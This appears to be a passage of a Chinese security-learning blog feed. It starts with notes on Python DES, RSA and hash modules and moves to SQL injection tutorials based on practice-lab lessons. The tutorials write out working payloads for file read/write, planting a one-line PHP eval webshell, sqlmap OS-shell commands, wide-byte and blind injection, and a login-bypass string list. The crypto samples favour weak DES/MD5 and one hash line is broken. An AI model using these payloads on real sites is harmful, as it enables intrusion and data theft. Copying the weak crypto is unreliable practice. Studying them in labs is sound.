    <link href="/Python%E4%B8%AD%E7%9A%84RSA%E3%80%81DES%E3%80%81HASH%E5%8A%A0%E5%AF%86/"/>
    <url>/Python%E4%B8%AD%E7%9A%84RSA%E3%80%81DES%E3%80%81HASH%E5%8A%A0%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<p>本文总结了python中进行加密的几个模块的使用</p><a id="more"></a><h1 id="Python中的RSA、DES、HASH加密"><a href="#Python中的RSA、DES、HASH加密" class="headerlink" title="Python中的RSA、DES、HASH加密"></a>Python中的RSA、DES、HASH加密</h1><h2 id="01-加密的分类"><a href="#01-加密的分类" class="headerlink" title="01 加密的分类"></a>01 加密的分类</h2><ol><li><p>对称加密</p><ul><li>加密和解密都使用相同的密钥</li><li>密钥较短，加密处理简单，加解密速度快<br>适合于加密大量数据的场合</li><li>举例：DES、AES</li></ul></li><li><p>非对称加密</p><ul><li>加密使用公开的公钥，解密使用私钥</li><li>密钥大，加解密速度慢<br>一般用于加密少量数据，适用于互联网传输公钥，应用于数字签名</li><li>举例：RSA</li></ul></li><li><p>Hash算法/数字签名</p><ul><li>是一种单向算法，难以由密文得到明文，用于检查信息是否被篡改</li><li>举例：MD5、SHA</li></ul></li></ol><h2 id="02-python中的pyDes"><a href="#02-python中的pyDes" class="headerlink" title="02 python中的pyDes"></a>02 python中的pyDes</h2><p>官方文档：</p><pre><code class="hljs asciidoc">'''类初始化--------------------pyDes.des（key，[mode]，[IV]，[pad]，[padmode]）pyDes.triple<span class="hljs-emphasis">_des（key，[mode]，[IV]，[pad]，[padmode]）</span><span class="hljs-emphasis"></span><span class="hljs-emphasis">key-&gt;包含加密密钥的字节。DES 8个字节，16或24个字节</span><span class="hljs-emphasis">       用于三重DES</span><span class="hljs-emphasis">mode-&gt;加密类型的可选参数，可以是</span><span class="hljs-emphasis">       pyDes.ECB（电子密码簿）或pyDes.CBC（密码块链接）</span><span class="hljs-emphasis">如果使用CBC模式，则必须提供IV-&gt;可选的初始值字节。</span><span class="hljs-emphasis">       长度必须为8个字节。</span><span class="hljs-emphasis">pad-&gt;可选参数，设置填充字符（PAD_</span>NORMAL）以在<span class="hljs-code">       使用此实例完成的所有加密/解密操作。</span>padmode-&gt;可选参数，设置填充模式（PAD<span class="hljs-emphasis">_NORMAL或PAD_</span>PKCS5）<span class="hljs-code">       在对此实例执行的所有加密/解密操作期间使用。</span>我建议使用PAD<span class="hljs-emphasis">_PKCS5填充，因为这样您就不必担心任何</span><span class="hljs-emphasis">填充问题，因为在解密时可以明确删除填充</span><span class="hljs-emphasis">使用PAD_</span>PKCS5填充模式加密的数据。常用方法--------------加密（数据，[填充]，[填充模式]）解密（数据，[pad]，[padmode]）数据-&gt;要加密/解密的字节pad-&gt;可选参数。仅在使用PAD<span class="hljs-emphasis">_NORMAL的padmode时。对于</span><span class="hljs-emphasis">       加密时，将以下字符添加到数据块的末尾</span><span class="hljs-emphasis">       数据不是8个字节的倍数。对于解密，将删除</span><span class="hljs-emphasis">       最后8个与此填充字符匹配的结尾字符</span><span class="hljs-emphasis">       未加密数据块的字节。</span><span class="hljs-emphasis">padmode-&gt;可选参数，设置填充模式，必须为PAD_</span>NORMAL之一<span class="hljs-code">       或PAD_PKCS5）。默认为PAD_NORMAL。</span>'''</code></pre><p>示例程序：<br>python3中要使用字节</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pyDes <span class="hljs-keyword">import</span> *<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">'__main__'</span>:    Des_Key = <span class="hljs-string">"itsmykey"</span>    Des_IV = <span class="hljs-string">b"\x22\x33\x35\x81\xBC\x38\x5A\xE7"</span>    data=<span class="hljs-string">b'hello'</span>    k = des(Des_Key, CBC, Des_IV, pad=<span class="hljs-literal">None</span>, padmode=PAD_PKCS5)    d=k.encrypt(data)    print(<span class="hljs-string">'已加密'</span>,d)    t=k.decrypt(d)    text=str(t, encoding=<span class="hljs-string">'utf8'</span>)    print(<span class="hljs-string">'已解密'</span>,text)</code></pre><h1 id="03-python中的rsa"><a href="#03-python中的rsa" class="headerlink" title="03 python中的rsa"></a>03 python中的rsa</h1><pre><code class="hljs python"><span class="hljs-keyword">import</span> rsa<span class="hljs-comment"># 生成密钥</span>(pubkey, privkey) = rsa.newkeys(<span class="hljs-number">1024</span>)<span class="hljs-comment"># 保存密钥</span><span class="hljs-keyword">with</span> open(<span class="hljs-string">'public.pem'</span>, <span class="hljs-string">'w+'</span>) <span class="hljs-keyword">as</span> f:    f.write(pubkey.save_pkcs1().decode())<span class="hljs-keyword">with</span> open(<span class="hljs-string">'private.pem'</span>, <span class="hljs-string">'w+'</span>) <span class="hljs-keyword">as</span> f:    f.write(privkey.save_pkcs1().decode())<span class="hljs-comment"># 导入密钥</span><span class="hljs-keyword">with</span> open(<span class="hljs-string">'public.pem'</span>, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:    pubkey = rsa.PublicKey.load_pkcs1(f.read().encode())<span class="hljs-keyword">with</span> open(<span class="hljs-string">'private.pem'</span>, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:    privkey = rsa.PrivateKey.load_pkcs1(f.read().encode())<span class="hljs-comment"># 明文</span>message = <span class="hljs-string">'hello'</span><span class="hljs-comment"># 公钥加密</span>crypto = rsa.encrypt(message.encode(), pubkey)<span class="hljs-comment"># 私钥解密</span>message = rsa.decrypt(crypto, privkey).decode()print(message)<span class="hljs-comment"># 私钥签名</span>signature = rsa.sign(message.encode(), privkey, <span class="hljs-string">'SHA-1'</span>)<span class="hljs-comment"># 公钥验证</span>rsa.verify(message.encode(), signature, pubkey)</code></pre><h2 id="04-python中的hashlib"><a href="#04-python中的hashlib" class="headerlink" title="04 python中的hashlib"></a>04 python中的hashlib</h2><ol><li><p>md5<br>生成md5加密，由字符串生成摘要很容易，但由摘要回到字符串很难，因此可以用来检查信息是否被篡改</p><p>md5是最常见的摘要算法，生成结果是固定的128bit字节，通常用一个32位的16进制字符串表示</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlibtext=<span class="hljs-string">'hello'</span>md5text=hashlib.md5(text.encode()).hexdigest()</code></pre><p>数据量很大时，可以分段调用update</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlibtext=<span class="hljs-string">'hello python'</span>md5=hashlib.md5()md5.update(<span class="hljs-string">'hello'</span>.encode())md5.update(<span class="hljs-string">'python'</span>.encode())print(md5.hexdigest())</code></pre></li><li><p>sha1<br>sha1的结果是160bit字节，通常用40位的16进制字符串表示，更安全的算法时sha256和sha512，但更慢且更长</p><pre><code class="hljs python">   <span class="hljs-keyword">import</span> hashlib      text=<span class="hljs-string">'hello'</span>md5text=hashlib.sha1(text.encode()).hexdigest()</code></pre></li><li><p>两个不同的数据也可能算出相同的摘要，这称为碰撞<br>摘要算法通常用于数据库之中，黑客可以事先算出常见密码的摘要进行对比，为了更加安全，可以对原始字符串加一个复杂字符串来实现，俗称加盐</p><pre><code class="hljs python">salt_md5=hashlib.md5(text+<span class="hljs-string">'salt'</span>.encode()).hexdigest()</code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>工具使用</tag>
      
      <tag>密码学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入 文件读写</title>
    <link href="/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/"/>
    <url>/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/</url>
    
    <content type="html"><![CDATA[<p>本文介绍了利用SQL注入读写文件，写入后门的方法</p><a id="more"></a><h1 id="SQL注入读写文件"><a href="#SQL注入读写文件" class="headerlink" title="SQL注入读写文件"></a>SQL注入读写文件</h1><h2 id="01-读写文件的前提"><a href="#01-读写文件的前提" class="headerlink" title="01 读写文件的前提"></a>01 读写文件的前提</h2><ol><li><p>知道读写文件的绝对路径</p></li><li><p>当前用户权限足够</p></li><li><p>secure_file_priv参数配置正确：</p><p>该参数限制了文件读写的路径，在mysql配置文件中修改</p><ol><li>secure_file_priv=               不对读写作出限制</li><li>secure_file_priv=null        禁止读写</li><li>secure_file_priv=’path’     只允许在path路径下操作，包括子目录</li></ol></li></ol><h2 id="02-读取文件"><a href="#02-读取文件" class="headerlink" title="02 读取文件"></a>02 读取文件</h2><p>以Lesson1为例，首先创建一个flag.txt</p><ol><li>?id=1’ order by 3–+ 得到有三个字段</li><li>?id=-1’ union select 1,load_file(“绝对路径\flag.txt”),3 –+<br>在字段2处读取出文件<br><strong>联合查询要使前边报错</strong></li></ol><h2 id="03-写入文件"><a href="#03-写入文件" class="headerlink" title="03 写入文件"></a>03 写入文件</h2><p>以Lesson1为例</p><ol><li><p>?id=1’)) order by 3–+ 得到有三个字段</p></li><li><p>?id=1’)) union select 1,’&lt;?php phpinfo(); ?&gt;‘,3 into outfile ‘绝对路径’–+</p></li></ol><p>也可以写入一句话木马&lt;?php @eval($_POST[‘x’]; ?&gt;,然后使用菜刀链接</p><p>除了一句话木马，还可以使用weevely、webacco等生成后门</p><h2 id="03-sqlmap读写文件"><a href="#03-sqlmap读写文件" class="headerlink" title="03 sqlmap读写文件"></a>03 sqlmap读写文件</h2><p>读文件 sqlmap -u “url” –file-read “绝对路径flag.txt”</p><p>写文件 sqlmap -u “url” –file-write “本地绝对路径flag.txt” –file-dest “目标绝对路径”</p><p>检测权限 sqlmap -u “url” –is-dba</p><p>获取SQLshell ：sqlmap -u “url” –sql-shell</p><p>获取系统shell ：sqlmap -u “url” –os-shell</p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入 几种特殊的注入</title>
    <link href="/SQL%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
    <url>/SQL%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>本文介绍了二次注入、宽字节注入</p><a id="more"></a><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><h2 id="01-二次注入介绍"><a href="#01-二次注入介绍" class="headerlink" title="01 二次注入介绍"></a>01 二次注入介绍</h2><ol><li>先构造语句（此语句含有被转义字符的语句）</li><li>将我们构造的恶意语句存入数据库；</li><li>第二次构造语句（结合前面已被存入数据库的语句构造。因为系统没有已存入的数据做检查，成功注入）</li></ol><h2 id="02-二次注入利用"><a href="#02-二次注入利用" class="headerlink" title="02 二次注入利用"></a>02 二次注入利用</h2><p><strong>Lesson 24</strong></p><ol><li>注册用户名 admin’ – -<br>密码123456</li><li>进行登录</li><li>修改密码为112233</li><li>成功将admin的密码修改为112233<br>而admin’ – -的密码没有改变</li></ol><h2 id="03-二次注入危害"><a href="#03-二次注入危害" class="headerlink" title="03 二次注入危害"></a>03 二次注入危害</h2><ol><li>注入payload触发二次sql注入</li><li>注入payload触发xss攻击</li></ol><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>宽字节注入适用于单引号被转义为\‘的场景，原理是将反斜杠拼接成一个宽字符，从而避免单引号被转义</p><h2 id="01-宽字节注入基础"><a href="#01-宽字节注入基础" class="headerlink" title="01 宽字节注入基础"></a>01 宽字节注入基础</h2><p>GBK编码 占用两字节，ASCII编码占用一个字节</p><p>PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集</p><p>如果PHP中有addslashes函数，单引号就会被转义为\‘，通常使用%DF进行宽字符注入绕过，’URL编码是%27，\URL编码是%5C，即%DF\‘会被转为%DF%5C%27</p><p>若网站的字符集是GBK，MYSQL使用的编码也是GBK，就会认为%DF%5C是一个宽字符,从而解析为 <strong>宽字符’</strong></p><p>最常使用的宽字节注入是%DF，其实只要用ascii码大于128的即可</p><p>%81-%FE均可注入<strong>（%7F除外）</strong></p><p><strong>ascii码转码方法</strong></p><p>如ascii码为129，先将129转为十六进制，即为0x81，然后加%即可，%81</p><h2 id="02-绕过演示"><a href="#02-绕过演示" class="headerlink" title="02 绕过演示"></a>02 绕过演示</h2><p><strong>Lesson 32</strong></p><p>?id=-1%DF’ union select 1,database(),user() –+</p><p><strong>Lesson 33</strong></p><p>?id=-1%DF’ union select 1,database(),user() –+</p><h2 id="03-sqlmap安全测试"><a href="#03-sqlmap安全测试" class="headerlink" title="03 sqlmap安全测试"></a>03 sqlmap安全测试</h2><p>sqlmap -u “URL?id=%df%27”</p><p><strong>用于宽字节注入的脚本 unmagicquotes.py</strong></p><p>sqlmap -u “URL?id=1” –tamper=unmagicquotes.py</p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入 SQLmap的使用方法</title>
    <link href="/SQL%E6%B3%A8%E5%85%A5-SQLmap%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <url>/SQL%E6%B3%A8%E5%85%A5-SQLmap%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>本文介绍了自动化注入工具SQLmap常用的命令和脚本</p><a id="more"></a><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p>半自动化注入：burpsuite</p><p>自动化注入：sqlmap</p><p><strong>sqlmap需要使用python2环境</strong></p><h2 id="01-基本探测参数"><a href="#01-基本探测参数" class="headerlink" title="01 基本探测参数"></a>01 基本探测参数</h2><ol><li><p>-u “url” 设定注入点</p></li><li><p>–dbs 列出所有数据库名</p><p>–current-db 列出当前数据库</p><p>-D 指定一个数据库</p></li><li><p>–tables 列出所有表名</p><p>–T 指定一个表</p></li><li><p>–columns 列出所有字段名</p><p>-C 指定字段</p></li><li><p>–dump 列出字段内容</p></li></ol><p>示例：</p><ol><li>sqlmap -u url –dbs –batch<br>得到数据库有information_schema、security等</li><li>sqlmap -u url -D security –tables –batch<br>得到表有users</li><li>sqlmap -u url -D security -T users –columns –batch<br>得到username和password</li><li>sqlmap -u url -D security -T users -C username,password –dump –batch<br>得到具体值</li></ol><p>-v 输出级别分为0-6，默认为1 ：<br>0：只显示Python的tracebacks信息、错误信息和关键信息<br>1：同时显示普通信息[INFO]和警告信息[WARNING]；<br>2：同时显示调试信息[DEBUG]；<br>3：同时显示注入使用的攻击荷载；<br>4：同时显示HTTP请求；<br>5：同时显示HTTP响应头；<br>6：同时显示HTTP响应体。</p><p>-d 直接连接数据库</p><h2 id="02-获取目标参数"><a href="#02-获取目标参数" class="headerlink" title="02 获取目标参数"></a>02 获取目标参数</h2><ol><li><p>–batch 所有交互选项使用默认选项</p></li><li><p>–banner 返回banner信息</p></li><li><p>对单一url探测 sqlmap -u url </p></li><li><p>从文件中读取目标：</p><ul><li>-l 从burpsuite proxy 或者webscarab proxy中读取http请求日志文件<br>burpsuite==&gt;Project options==&gt;Logging==&gt;Proxy==&gt;Requests</li></ul><ul><li><p>-x 从sitemap.xml站点地图文件中读取目标探测</p></li><li><p>-m 从多行文本格式文件中读取多个目标，对多个目标进行探测</p></li><li><p>-r 从文本文件中读取http请求作为sql注入的探测目标</p></li><li><p>-c 从配置文件 sqlmap.conf中读取目标探测</p></li></ul></li><li><p>-g 自动利用google获取指定的googlehack等目标，然后利用交互向导模式进行探测</p></li><li><p>-f fingerprint</p></li></ol><h2 id="设置请求参数"><a href="#设置请求参数" class="headerlink" title="设置请求参数"></a>设置请求参数</h2><ol><li><p>设置http方法<br>一般情况下会自动使用合适的方法，但是PUT方法不会自动使用 –method=PUT</p></li><li><p>设置post提交参数</p><p>默认方法是GET，可以提供POST请求中的数据将其隐性改变成POST<br>Sqlmap -u url –data=”data” </p><p>使用burpsuite抓包，保存为1.txt<br>sqlmap -r 1.txt</p></li><li><p>设置参数分隔符<br>默认分隔符为&amp;，也可以指定 –param-del=”分隔符”</p></li><li><p>设置cookie –cookie</p><p>使用场景：web应用有基于cookie验证的过程 想用cookie的值进行注入</p><p>web应用程序使用set-cookie进行响应，sqlmap将在所有进一步http请求中自动使用其值作为cookie标头。可以使用–drop-set-cookie将忽略任何即将到来的set-cookie头</p><p>load-cookie 可以用来提供包含Netscape/wget格式的cookie的特殊文件</p><p><strong>注意：如果对http cookie值进行探测，需要设置–level 2及以上</strong></p></li><li><p>设置user-agent<br>设置为指定值 –user-agent=””<br>设置为随机值 –random-agent<br>target.txt中在user-agent后边加一个*，表示对user-agent进行探测</p><p><strong>注意：如果对user-agent值进行探测，需要设置–level 3及以上</strong></p></li><li><p>设置host</p><p><strong>注意：如果对host值进行探测，需要设置–level 5</strong></p></li><li><p>设置referer<br><strong>注意：如果对referer值进行探测，需要设置–level 3及以上</strong></p></li><li><p>额外的http头<br>一个头 -H或–header<br>多个头 –headers=”Host:www,target.com\nUser-agent:Firefox” -v 5<br>多个标头用换行分隔<br>也可以在配置文件中进行设置<br>-v 5 是为了现实输出结果</p></li><li><p>读文件<br>–file-read ‘文件绝对路径’</p></li><li><p>写入文件<br>  –file-write ‘本地绝对路径’ –file-dest ‘目标绝对路径’</p></li><li><p>设定探测类型<br>–technique BEUSTQ </p><ul><li>B 布尔类型 </li><li>E 基于错误</li><li>U union查询</li><li>S 堆叠查询</li><li>T 基于时间的查询</li><li>Q 查询</li></ul><p>若不指定则使用全部技术</p></li></ol><h2 id="使用tamper脚本"><a href="#使用tamper脚本" class="headerlink" title="使用tamper脚本"></a>使用tamper脚本</h2><p>sqlmap … –tamper ‘脚本名’</p><p>常见的tamper有：</p><ol><li><p>apostrophemask.py<br>将单引号URL编码，避免被过滤</p></li><li><p>apostrophenullencode.py</p><p>将单引号替换为宽字节编码，避免被过滤</p></li><li><p>base64encode.py<br>进行base64编码</p></li><li><p>between.py<br>将大于号和等号替换为between</p></li><li><p>equaltolike.py<br>将=替换为like</p></li><li><p>space2comment.py<br>将空格替换为/**/</p></li><li><p>space2randomblank.py<br>将空格替换为随机的空白字符</p></li><li><p>space2plus.py<br>将空格替换为+</p></li><li><p>space2mysqldash.py<br>将空格替换为–\n</p></li><li><p>bluecoat.py<br>替换sql关键字后边的空格，并且将=替换为like</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>工具使用</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入 盲注</title>
    <link href="/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/"/>
    <url>/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<p>本文简单介绍了一种特殊的SQL注入，盲注</p><a id="more"></a><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>盲注的原理是向数据库发送判断真假的语句，根据页面状态判断真假</p><p>盲注可以分为基于布尔的盲注和基于时间的盲注，后者耗时较长</p><h2 id="01-基于布尔的盲注"><a href="#01-基于布尔的盲注" class="headerlink" title="01 基于布尔的盲注"></a>01 基于布尔的盲注</h2><p>原理：根据页面显示的状态判断查询语句真假</p><p>适用场景：网页会因为查询语句的真假而显示不同的状态</p><p>例如一个网页在查询为真时，页面无显示，而查询为假时页面会有警告，这时就可以使用盲注进行注入，通常使用枚举的方法。</p><p>常用的函数如substr(str,m,n)即从字符串str的第m个字符（从1开始计数，包括自身）向后取n个字符，substr(str,1,1)即取第一个字符。</p><p>如获取数据库名：</p><ul><li>获取数据库长度<ul><li>?id=1 and length(database())=1 –+ 页面显示为假</li><li>?id=1 and length(database())=2 –+ 页面显示为假</li><li>?id=1 and length(database())=3 –+ 页面显示为真，得到数据库名的长度为3</li></ul></li><li>获取数据库名<ul><li>?id=1 and ascii(substr(databse(),1,1))=97 –+ 页面显示为假</li><li>?id=1 and ascii(substr(databse(),1,1))=98 –+ 页面显示为假</li><li>?id=1 and ascii(substr(databse(),1,1))=99 –+ 页面显示为真，得到数据库名的第一个字符的ASCII码为99，即c</li></ul></li></ul><p>同理可以继续进行探测</p><p><strong>为了避免次数过多，可以转换成ASCII码，然后使用位运算比较</strong></p><h2 id="02-基于时间的盲注"><a href="#02-基于时间的盲注" class="headerlink" title="02 基于时间的盲注"></a>02 基于时间的盲注</h2><p>原理：根据页面延时判断查询语句真假</p><p>适用场景：无论查询语句真假，网页显示的状态相同，此时我们可以使用sleep()函数构造查询语句，人为创造出页面显示的真假状态，即加载时长。</p><p>常用语句if(exp,t,f)即当表达式exp为真时返回t，为假时返回f<br>if(ascII(substr(database(),1,1)=115,sleep(3),1))表示当数据库名第一个字符的ASCII码是115时就延时3s，否则返回1（正常显示无延时）</p><p>如获取数据库名：</p><ul><li>获取数据库长度<ul><li>?id=1 and if(length(database())=1,sleep(5),1) –+ 页面正常加载</li><li>?id=1 and if(length(database())=2,sleep(5),1) –+ 页面正常加载</li><li>?id=1 and if(length(database())=3,sleep(5),1) –+ 页面加载延时5s，得到数据库名的长度为3</li></ul></li><li>获取数据库名<ul><li>?id=1 and if(ascii(substr(databse(),1,1))=97,sleep(5),1) –+ 页面正常加载</li><li>?id=1 and if(ascii(substr(databse(),1,1))=98,sleep(5),1) –+ 页面正常加载</li><li>?id=1 and if(ascii(substr(databse(),1,1))=99,sleep(5),1) –+ 页面加载延时5s，得到数据库名的第一个字符的ASCII码为99，即c</li></ul></li></ul><p>除sleep外还可以使用benchmark函数<br>benchmark(n,exp)表示执行表达式exp n次，当n很大时就可以起到延时效果<br>如if(ascii(substr(databse(),1,1))=97,benchmark(md5(‘a’),1000000),1)</p><h2 id="03-SQLmap盲注"><a href="#03-SQLmap盲注" class="headerlink" title="03 SQLmap盲注"></a>03 SQLmap盲注</h2><p>sqlmap -u url –technique T –dbs 指定-T为基于时间的盲注<br><strong>BEUSTQ B布尔 E错误 Uunion注入 S堆叠 T时间 Q查询</strong><br><strong>若不指定则使用全部技术，时间较长</strong></p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入整理</title>
    <link href="/SQL%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/"/>
    <url>/SQL%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>本文整理了SQL注入的原理、分类等基础知识</p><a id="more"></a><h1 id="SQL注入简介"><a href="#SQL注入简介" class="headerlink" title="SQL注入简介"></a>SQL注入简介</h1><h2 id="01-SQL注入的原因"><a href="#01-SQL注入的原因" class="headerlink" title="01 SQL注入的原因"></a>01 SQL注入的原因</h2><ol><li>程序编写者在处理程序和数据库交互时，使用字符串拼接的方式构造SQL语句</li><li>未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中</li></ol><h2 id="02-可能存在SQL注入的位置"><a href="#02-可能存在SQL注入的位置" class="headerlink" title="02 可能存在SQL注入的位置"></a>02 可能存在SQL注入的位置</h2><p>web应用在获取用户数据的地方，只要带入数据库查询，就可能存在注入</p><p>常见的地方包括：</p><ol><li>GET数据</li><li>POST数据</li><li>HTTP头部</li><li>COOKIE数据</li></ol><p>…</p><h2 id="03-SQL注入的危害"><a href="#03-SQL注入的危害" class="headerlink" title="03 SQL注入的危害"></a>03 SQL注入的危害</h2><ol><li>获取管理员的账号密码</li><li>获取数据库中内容</li><li>修改或插入数据到数据库内</li><li>利用注入漏洞获得webshell</li><li>mof提权、udf提权</li></ol><h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><h2 id="01-简单案例讲解"><a href="#01-简单案例讲解" class="headerlink" title="01 简单案例讲解"></a>01 简单案例讲解</h2><ol><li><p>在常见的登录页面，通常使用如下SQL语句：<br>select * from admin where username=’输入的用户名’ and password=’输入的密码’</p><p>如果用户输入的用户名为’ or 1=1 –  <strong>注意最后需要有一个空格</strong><br>拼接起来的SQL语句为<br>select * from admin where username=’ <strong>‘ or 1=1 –</strong> <del>‘ and password=’输入的密码’</del></p><p>使用单引号提前闭合，or 1=1永远为真，–将后边的内容注释掉，即完成查询，实现了登录，我们输入的’ or 1=1 –  就可以看作为一个万能密码</p></li><li><p>SQL语句中的注释</p></li></ol><ul><li><p>#（可以用%23代替)</p></li><li><p>–+ 或者–空格 (空格可以用%20代替)</p></li><li><p>/<em>….\</em>/</p></li><li><p>/<em>!…\</em>/ 此为内联注释，在mysql中可以执行注释中的语句，其他系统无法执行<br>如：select * from articles where id=id</p><p>使用内联注释注入 select *from articles where id=</p><p>-1 /*!union*//*!select*/ 1,2,3,4</p><p>在mysql中可以执行 union select 1,2,3,4</p></li></ul><p>以下列出了一些常见的万能密码</p><pre><code class="hljs ada"><span class="hljs-symbol">'or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span>/*<span class="hljs-string">"or "</span>a<span class="hljs-string">"="</span>a<span class="hljs-string">"or 1=1--</span><span class="hljs-string">"</span><span class="hljs-keyword">or</span><span class="hljs-string">"="</span><span class="hljs-string">"or"</span>=<span class="hljs-string">"a'='a</span><span class="hljs-string">"</span>or1=<span class="hljs-number">1</span><span class="hljs-comment">--</span><span class="hljs-string">"or=or"</span>'<span class="hljs-symbol">'or</span><span class="hljs-string">'='</span><span class="hljs-keyword">or</span>'') <span class="hljs-keyword">or</span> (<span class="hljs-string">'a'</span>=<span class="hljs-symbol">'a</span>'.).<span class="hljs-keyword">or</span>.('.a.<span class="hljs-string">'='</span>.a<span class="hljs-symbol">'or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-symbol">'or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">--</span><span class="hljs-symbol">'or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span>/*<span class="hljs-symbol">'or</span><span class="hljs-string">"="</span>a<span class="hljs-string">'='</span>a<span class="hljs-symbol">'or</span><span class="hljs-string">' '</span><span class="hljs-number">1</span><span class="hljs-string">'='</span><span class="hljs-number">1</span>'<span class="hljs-symbol">'or</span>'<span class="hljs-string">'='</span><span class="hljs-symbol">'or</span>'<span class="hljs-string">'='</span><span class="hljs-symbol">'or</span>'<span class="hljs-string">'='</span><span class="hljs-symbol">'or</span><span class="hljs-string">'='</span><span class="hljs-number">1</span>'<span class="hljs-symbol">'or</span><span class="hljs-string">'='</span><span class="hljs-keyword">or</span>'<span class="hljs-symbol">'or.</span><span class="hljs-symbol">'a.</span><span class="hljs-string">'='</span>a<span class="hljs-symbol">'or1</span>=<span class="hljs-number">1</span><span class="hljs-comment">--</span><span class="hljs-number">1</span><span class="hljs-symbol">'or</span><span class="hljs-string">'1'</span>='<span class="hljs-number">1</span>a<span class="hljs-symbol">'or</span>' <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">--</span>a<span class="hljs-symbol">'or</span>'<span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">--</span><span class="hljs-keyword">or</span> <span class="hljs-string">'a'</span>=<span class="hljs-string">'a'</span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">--</span>or1=<span class="hljs-number">1</span><span class="hljs-comment">--</span></code></pre><p>可以将以上密码作为字典，使用burpsuite用枚举的方法进行测试</p><h2 id="02-简单注入漏洞探测"><a href="#02-简单注入漏洞探测" class="headerlink" title="02 简单注入漏洞探测"></a>02 简单注入漏洞探测</h2><p>一般网页的CMS逻辑为：CMS逻辑：index.php首页展示内容，具有文章列表（链接具有文章id）、articles.php文章详细页，URL中article.php?id=文章id读取id对应文章<br>可以利用Google Hacking寻找可能存在漏洞的URL</p><p>简单验证方法，如在URL中?id=1 后边添加内容：</p><ol><li>单引号 ‘</li><li>and 1=1</li><li>and 1=2</li></ol><p>*<em>逻辑运算<br>在SQL语句中，and比or的优先级高<br>select 1=2 and 1=2 or 1=1<br>返回的结果为1 *</em></p><p>如果页面中mysql报错，证明存在sql注入漏洞<br>如果报错信息中存在自己输入的值，就是字符型注入，否则是数字型注入    </p><p>根据页面显示的内容，可以分为报错注入、盲注等</p><h2 id="03-SQL注入的分类"><a href="#03-SQL注入的分类" class="headerlink" title="03 SQL注入的分类"></a>03 SQL注入的分类</h2><ol><li>根据输入数据的分类：<ul><li>数字型 select * from table where id=@id</li><li>字符型 select * from table where id=’@id’</li></ul></li><li>根据注入手法的分类：<ul><li>联合查询 页面有回显<br>使用order by判断出表的列数<br>使用select 1，2，3 观察各列的输出情况，替换成想要查询的内容</li><li>报错注入 页面有报错信息<br>报错信息会显示在页面中，可以执行报错注入<br>可以使用group by语句报错，如：<br>?id=1 union select 1,concat(left(rand(),3),’^’,(select version()),’^’)a,count(*),3 from information_schema.tables group by a –+</li><li>布尔盲注 页面有真假状态<br>通常使用二分法对数据库名等信息进行长度、ascii码的探测<br>根据页面的真假状态进行判断表达式是否正确</li><li>延时盲注 